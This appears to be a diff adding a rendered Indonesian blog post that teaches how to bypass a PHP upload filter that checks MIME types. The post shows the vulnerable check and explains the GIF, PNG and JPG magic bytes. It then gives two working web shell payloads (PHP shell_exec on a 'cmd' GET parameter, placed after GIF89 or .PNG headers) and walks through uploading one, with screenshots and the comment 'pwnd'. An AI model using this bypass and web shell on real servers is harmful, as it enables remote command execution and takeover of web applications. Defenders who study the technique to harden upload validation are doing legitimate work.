@@ -1,0 +1,75 @@
+I"Ð<p>Untuk melakukan upload filter yang dilakukan whitelist dalam bentuk MIME seperti muncul pada code PHP berikut :</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">'mime'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">'image/gif'</span> <span class="o">&amp;&amp;</span> 
+   <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">'mime'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">'image/jpeg'</span> <span class="o">&amp;&amp;</span> 
+   <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">'mime'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">'image/jpg'</span><span class="o">&amp;&amp;</span> 
+   <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">'mime'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">'image/png'</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">'Error 002'</span><span class="p">);</span> <span class="p">}</span>
+</code></pre></div></div>
+
+<p>disebutkan pada code tersebut bahwa hanya diperbolehkan untuk upload file yang dibatasi dengan MIME GIF, JPG dan PNG.
+lalu bagaimana untuk bypass upload seperti ini.</p>
+
+<p>cara mudahnya dengan cara menambahkan MIME tersebut pada shell yang akan di upload.</p>
+
+<p>pada setiap <strong>awal byte</strong> file memiliki header sebagai identifikasi bahwa file tersebut memiliki content yang diikuti oleh headernya.
+<strong>first byte</strong> ini biasa disebut MIME ( Multipurpose Internet Mail Extension ) pada kalangan internet, pada umumnya MIME disebut sebagai file file yang berekstensi yang dapat diikuti oleh format email yang meliputi standar email. MIME yang dimaksud disini adalah header yang berisikan informasi bahwa file tersebut adalah file berupa tipe apa dan menggunakan ekstensi apa.</p>
+
+<p>Maka dari itu artikel ini bertujuan utama untuk mengelabui fungsi utama dari php pada setiap kali mengirimkan file php akan mereturn beberapa data berupa array yang berisikan informasi mengenai file dari file size, file name, file extension dan juga file mime.</p>
+
+<p>Setiap File memiliki <strong>first byte</strong> yang berbeda beda, berikut saya jelaskan beberapa <strong>first byte</strong> untuk file GIF, JPG dan PNG</p>
+
+<p>GIF : pada first offset memiliki string <strong>GIF89</strong> atau 5 first byte nya <strong>4749 4638 39</strong></p>
+<blockquote>
+  <p><img src="http://k1m0ch1.github.io/images/first-byte-GIF.png" alt="GIF first offest" /></p>
+</blockquote>
+
+<p>PNG : pada first offset memiliki string <strong>.PNG</strong> atau 5 first byte nyte <strong>8950 4e47 0d</strong></p>
+<blockquote>
+  <p><img src="http://k1m0ch1.github.io/images/first-byte-png.png" alt="PNG first offest" /></p>
+</blockquote>
+
+<p>JPG : pada first offset memiliki string <strong>JFIF</strong> JPG memiliki null content sebanyak 6 byte, jadi first bytenya dimulai dari byte 7 <strong>4a46 4946 00</strong></p>
+<blockquote>
+  <p><img src="http://k1m0ch1.github.io/images/first-byte-JPG.png" alt="JPG first offest" /></p>
+</blockquote>
+
+<p>jadi first offset tersebut yang mengidtentifikasikan bahwa file tersebut tipe datanya seperti demikian.</p>
+
+<p>lalu cara untuk bypass nya adalah cukup dengan membuat file *.gif atau tipe ekstensi yang di gunakan lalu dengan content file seperti berikut</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">GIF89</span>
+
+<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">echo</span> <span class="n">shell_exec</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s">'cmd'</span><span class="p">]);</span> <span class="err">?</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">PNG</span>
+
+<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">echo</span> <span class="n">shell_exec</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s">'cmd'</span><span class="p">]);</span> <span class="err">?</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>so lets try it</p>
+
+<p>Upload File shell langsung</p>
+
+<blockquote>
+  <p><img src="http://k1m0ch1.github.io/images/upload-file-1.png" alt="trying to upload file shell" /></p>
+</blockquote>
+
+<p>ternyata terdapat whitelist</p>
+
+<blockquote>
+  <p><img src="http://k1m0ch1.github.io/images/upload-file-blocked.png" alt="trying to upload file shell" /></p>
+</blockquote>
+
+<p>lalu di coba upload file shell yang sudah diedit</p>
+
+<blockquote>
+  <p><img src="http://k1m0ch1.github.io/images/upload-file-2.png" alt="trying to upload file shell" /></p>
+</blockquote>
+
+<p>pwnd</p>
+
+<blockquote>
+  <p><img src="http://k1m0ch1.github.io/images/pwnd.png" alt="trying to upload file shell" /></p>
+</blockquote>
+:ET
